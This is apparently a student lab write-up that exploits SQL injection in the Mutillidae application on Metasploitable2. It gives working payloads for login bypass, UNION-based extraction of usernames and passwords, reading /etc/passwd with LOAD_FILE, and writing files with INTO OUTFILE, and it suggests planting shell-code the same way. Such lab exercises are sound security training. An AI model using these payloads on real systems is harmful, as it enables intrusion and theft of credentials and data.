# Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

OUTPUT:
![image](https://github.com/user-attachments/assets/78557c5f-7dcc-434f-9f47-1c7d7ac6a87f)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

OUTPUT:
![image](https://github.com/user-attachments/assets/a81e296f-5c10-42cf-98f0-72e750bce254)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

OUTPUT:

![image](https://github.com/user-attachments/assets/8d142249-a7f5-4978-ac5d-9cff00ff36d4)

Click on the menu Login/Register and register for an account

OUTPUT:

![image](https://github.com/user-attachments/assets/648bdacd-5abf-4fbc-be8b-249610acb6ae)

Click on the link “Please register here”

OUTPUT:
![image](https://github.com/user-attachments/assets/74e20c28-1187-473d-8531-359b063a979a)

Click on “Create Account” to display the following page:

OUTPUT:
![image](https://github.com/user-attachments/assets/2eddb4a5-3bd9-4100-8cc9-d0204b0ff8bd)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page. Click “Login”.

OUTPUT:
![image](https://github.com/user-attachments/assets/e646f99f-daab-4cf1-affd-012451f27b25)
## Bypassing login field
The username field is vulnerable. Put (blaise’ #) or (blaise’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “blaise.” Now after logging out you will see the login page. In the login page give blaise’ # . You can see the page now enters into the administrator page as before when giving the password.

OUTPUT:
![image](https://github.com/user-attachments/assets/18b392d4-14b7-419d-b578-470c561463d5)
Click the login button and you will see it enter into the administrator page

OUTPUT:
![image](https://github.com/user-attachments/assets/aae2c74a-5fb8-4b1c-ac3e-afadeed199ec)

Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:

OUTPUT:
![image](https://github.com/user-attachments/assets/f6c3ec36-b020-4815-af9b-9e611928f183)

![image](https://github.com/user-attachments/assets/9d4d4220-2b38-42fd-b23c-7bec3973cec8)

![image](https://github.com/user-attachments/assets/f4ff93f9-3f00-493a-8b0e-649827fc24dd)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

OUTPUT:
![image](https://github.com/user-attachments/assets/ba1f4fec-7c54-450d-837e-cfef28726e31)
After adding the order by 6 into the existing url , the following error statement will be obtained:

OUTPUT:

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

OUTPUT:
![image](https://github.com/user-attachments/assets/82e47104-16a0-4cc0-822a-28afd2d9f560)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).

OUTPUT:

![image](https://github.com/user-attachments/assets/5b053226-8694-489a-9675-7de6338866be)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database. http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

OUTPUT:

![image](https://github.com/user-attachments/assets/54bef19b-8c10-487f-802f-3ceb17082153)

The url once executed will retrieve table names from the “owasp 10” database.

Extracting sensitive data such as passwords
When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

The column names of the accounts is displayed below for the following url: http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
OUTPUT:

![image](https://github.com/user-attachments/assets/e0539ef9-6fd4-4194-ad80-5b2b6fef1723)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts). http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

OUTPUT:


![image](https://github.com/user-attachments/assets/29ddb4ee-4847-4dda-9418-de52c71056cf)
Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null). http://192.168.1.10/mutillidae/index.php?page=user-info.php&username=blaise%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

OUTPUT:

![image](https://github.com/user-attachments/assets/f300cbf7-b6f0-4d73-b653-7ae3d029cdbe)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
